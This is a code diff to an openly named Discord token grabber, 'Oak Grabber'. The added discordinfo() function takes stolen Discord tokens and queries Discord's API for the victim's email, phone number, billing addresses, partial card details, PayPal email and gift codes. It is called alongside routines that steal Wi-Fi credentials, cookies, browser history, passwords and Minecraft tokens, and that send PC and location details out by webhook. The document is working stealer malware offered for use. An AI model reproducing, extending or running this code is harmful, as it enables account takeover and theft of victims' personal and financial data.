@@ -24,6 +24,7 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 
 accounts = []
+checked = []
 filename =  os.path.basename(sys.argv[0])
 appdata = os.getenv("localappdata")
 roaming = os.getenv("appdata")
@@ -77,14 +78,11 @@ def decrypt_password(buff, master_key):
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted_pass = cipher.decrypt(payload)[:-16].decode()
             return decrypted_pass
-        except Exception as f:
-        
-            print(f)
+        except:
             return "Chrome < 80"
 def find_tokens(path):
+    dctokens = ""
     path += '\\Local Storage\\leveldb'
-    tokens = []
-
     for file_name in os.listdir(path):
         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
             continue
@@ -92,9 +90,10 @@ def find_tokens(path):
         for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore') if x.strip()]:
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'):
                 for token in re.findall(regex, line):
-                    tokens.append(token)
+                    checked.append(token)
+                    dctokens+=(f"{token} \n\n")
 
-    return tokens
+    return checked
 def killfiddler():
     for proc in psutil.process_iter():
         if proc.name() == "Fiddler.exe":
@@ -194,6 +193,7 @@ def main():
     else:
      message = '**someone ran ur Oak Grabber**'
     for platforrm, path in default_paths.items():
+        dctokens = ""
         if not os.path.exists(path):
             continue
         tokens = find_tokens(path)
@@ -202,9 +202,13 @@ def main():
                 if token in checked:
                     continue
                 checked.append(token)
-                embedMsg = f"""**someone ran ur Oak Grabber**\n\n**Tokens:** ```{token}```"""
+                dctokens+=(f"""{token} \n\n""")
+                embedMsg = f"""**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n**Tokens:** ```{dctokens}```"""
         else:
-            embedMsg = '''**someone ran ur Oak Grabber**\n\n```No tokens found.```'''
+            embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
+
+
+
 
     headers = {
         'Content-Type': 'application/json',
@@ -401,6 +405,197 @@ Processes running
         for smh in to_grab:
             if ntpath.exists(ntpath.join(mc, smh)):
                 shutil.copy2(ntpath.join(mc, smh), minecraft)
+    def discordinfo():
+        info = ""
+        for token in checked:
+            languages = {
+                    'da'    : 'Danish, Denmark',
+                    'de'    : 'German, Germany',
+                    'en-GB' : 'English, United Kingdom',
+                    'en-US' : 'English, United States',
+                    'es-ES' : 'Spanish, Spain',
+                    'fr'    : 'French, France',
+                    'hr'    : 'Croatian, Croatia',
+                    'lt'    : 'Lithuanian, Lithuania',
+                    'hu'    : 'Hungarian, Hungary',
+                    'nl'    : 'Dutch, Netherlands',
+                    'no'    : 'Norwegian, Norway',
+                    'pl'    : 'Polish, Poland',
+                    'pt-BR' : 'Portuguese, Brazilian, Brazil',
+                    'ro'    : 'Romanian, Romania',
+                    'fi'    : 'Finnish, Finland',
+                    'sv-SE' : 'Swedish, Sweden',
+                    'vi'    : 'Vietnamese, Vietnam',
+                    'tr'    : 'Turkish, Turkey',
+                    'cs'    : 'Czech, Czechia, Czech Republic',
+                    'el'    : 'Greek, Greece',
+                    'bg'    : 'Bulgarian, Bulgaria',
+                    'ru'    : 'Russian, Russia',
+                    'uk'    : 'Ukranian, Ukraine',
+                    'th'    : 'Thai, Thailand',
+                    'zh-CN' : 'Chinese, China',
+                    'ja'    : 'Japanese',
+                    'zh-TW' : 'Chinese, Taiwan',
+                    'ko'    : 'Korean, Korea'
+            }
+            cc_digits = {
+                f'american express': '3',
+                f'visa': '4',
+                f'mastercard': '5'
+            }
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                    'Content-Type': 'application/json',
+                    'Authorization': token}
+            try:
+             res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+            except:
+                pass
+            if res.status_code == 200:
+                    res_json = res.json()
+                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                    user_id = res_json['id']
+                    avatar_id = res_json['avatar']
+                    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
+                    phone_number = res_json['phone']
+                    email = res_json['email']
+                    mfa_enabled = res_json['mfa_enabled']
+                    flags = res_json['flags']
+                    locale = res_json['locale']
+                    verified = res_json['verified']
+
+                    language = languages.get(locale)
+                    from datetime import datetime
+                    creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
+                    has_nitro = False
+                    res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+                    nitro_data = res.json()
+                    has_nitro = bool(len(nitro_data) > 0)
+
+                    if has_nitro:
+                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                        days_left = abs((d2 - d1).days)
+                    billing_info = []
+
+                    for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
+                        yy = x['billing_address']
+                        name = yy['name']
+                        address_1 = yy['line_1']
+                        address_2 = yy['line_2']
+                        city = yy['city']
+                        postal_code = yy['postal_code']
+                        state = yy['state']
+                        country = yy['country']
+
+                        if x['type'] == 1:
+                            cc_brand = x['brand']
+                            cc_first = cc_digits.get(cc_brand)
+                            cc_last = x['last_4']
+                            cc_month = str(x['expires_month'])
+                            cc_year = str(x['expires_year'])
+            
+                            data = {
+                                f'Payment Type': 'Credit Card',
+                                f'Valid': not x['invalid'],
+                                f'CC Holder Name ': name,
+                                f'CC Brand': cc_brand.title(),
+                                f'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
+                                f'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
+                                f'Address 1': address_1,
+                                f'Address 2': address_2 if address_2 else '',
+                                f'City': city,
+                                f'Postal Code': postal_code,
+                                f'State': state if state else '',
+                                f'Country': country,
+                                f'Default Payment Method': x['default']
+                            }
+
+                        elif x['type'] == 2:
+                            data = {
+                                f'Payment Type': 'PayPal',
+                                f'Valid': not x['invalid'],
+                                f'PayPal Name': name,
+                                f'PayPal Email': x['email'],
+                                f'Address 1': address_1,
+                                f'Address 2': address_2 if address_2 else '',
+                                f'City': city,
+                                f'Postal Code': postal_code,
+                                f'State': state if state else '',
+                                f'Country': country,
+                                f'Default Payment Method': x['default']
+                            }
+
+                        billing_info.append(data)
+
+                    info += f"""Discordinfo | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\nBasic Information
+Username: {user_name}
+avatar id: {avatar_id}
+User ID: {user_id}
+Creation Date: {creation_date}
+Avatar URL: {avatar_url if avatar_id else ""}
+Token: {token}\n
+Nitro: {has_nitro}\n"""
+
+                    if has_nitro:
+                        info += (f"""Expires in: {days_left} day(s)\n""")
+                    else:
+                        info += (f"""Expires in: None day(s)\n\n""")
+
+                    info += f"""Phone Number: {phone_number if phone_number else ""}
+Email: {email if email else ""}\n"""
+
+                    if len(billing_info) > 0:
+                        info += (f"""\nBilling Information\n""")
+                        if len(billing_info) == 1:
+                            for x in billing_info:
+                                for key, val in x.items():
+                                    if not val:
+                                        continue
+                                    info +=('{:<23}{}{}'.format(key, val,"\n"))
+
+                        else:
+                            for i, x in enumerate(billing_info):
+                                title = f'Payment Method {i + 1} ({x["Payment Type"]})'
+                                info +=( title+"\n")
+                                info +=( ('=' * len(title))+"\n")
+                                for j, (key, val) in enumerate(x.items()):
+                                    if not val or j == 0:
+                                        continue
+                                    info +=('        {:<23}{}{}'.format(key, val,"\n"))
+
+                                if i < len(billing_info) - 1:
+                                    info +=('\n')
+
+                        info +=('\n')
+
+                    info +=(f"""\nAccount Security\n""")
+                    info +=(f"""2FA/MFA Enabled: {mfa_enabled}\n""")
+                    info +=(f"""Flags: {flags}\n""")
+                    info +=(f"""Other:\n""")
+                    info +=(f"""Locale: {locale} ({language})\n""")
+                    info +=(f"""Email Verified: {verified}\n""")
+                    g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
+                    val_codes = []
+                    if "code" in g.text:
+                      codes = json.loads(g.text)
+                    try:
+                      for code in codes:
+                        val_codes.append((code['code'], code['promotion']['outbound_title']))
+                    except TypeError:
+                       pass
+
+                    if val_codes == []:
+                     info += f'\nNo Gift Cards Found\n'
+                    else:
+                     for c, t in val_codes:
+                      info += f'\n{t}:\n{c}\n'
+            elif res.status_code == 401:
+                    info +=(f"""Invalid token\n""")
+                    pass
+            
+        with open ("discordinfo.txt","w") as f:
+         f.write(str(info))
+
     def zip():
             os.chdir(temp)
             shutil.make_archive(wiseoaktree, 'zip', wiseoaktree)
@@ -429,7 +624,7 @@ Processes running
                              "url": "https://github.com/j0taro/Oak-token-Grabber",
                              "icon_url": "https://i.imgur.com/bbWgtHI.png"
                          },
-                         "description": f"""{embedMsg}\n**__PC INFO__**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
+                         "description": f"""{embedMsg}\n**__PC INFO__ <:pc:1035526269925867640>**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__ <:loc:1035525770258415657>**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info <:fr:1035524460939329617>**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
                          "color": 0x1e8a81,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "thumbnail": {
@@ -460,6 +655,7 @@ Processes running
       messagebox.showerror('Error', error_message)
     wifistealer()
     mc()
+    discordinfo()
     cookies()
     history() #code kinda missed up here fr lmao
     passwords()
